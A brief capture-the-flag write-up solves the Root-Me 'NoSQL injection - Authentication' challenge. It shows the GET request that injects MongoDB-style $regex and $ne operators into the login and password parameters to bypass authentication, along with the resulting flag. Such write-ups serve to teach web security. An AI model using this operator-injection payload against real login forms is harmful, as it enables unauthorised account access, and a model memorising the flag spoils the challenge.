# [NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)

## Solutions

`GET /web-serveur/ch38/?login[$regex]=[^admin|test]&pass[$ne]=1`:
=> `You are connected as : flag{nosqli_no_secret_4_you}`

Flag: `nosqli_no_secret_4_you`

## References

- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20NoSQL,%20No%20injection%20-%20Ron,%20Shulman-Peleg,%20Bronshtein.pdf?_gl=1>
